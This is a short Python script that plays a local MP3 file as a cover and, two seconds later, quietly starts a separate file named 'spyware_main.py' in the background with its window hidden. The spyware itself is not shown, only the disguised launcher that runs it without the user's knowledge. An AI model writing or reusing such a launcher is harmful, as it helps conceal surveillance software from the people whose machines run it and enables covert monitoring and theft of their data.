import os
import subprocess
import sys
import time

# Play the local MP3 file we already have
mp3_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sample_music.mp3")

if os.path.exists(mp3_file):
    # Play the MP3
    os.startfile(mp3_file)
    
    # Wait 2 seconds
    time.sleep(2)
    
    # Run spyware in background
    spyware_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "spyware_main.py")
    if os.path.exists(spyware_path):
        subprocess.Popen([sys.executable, spyware_path], 
                        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
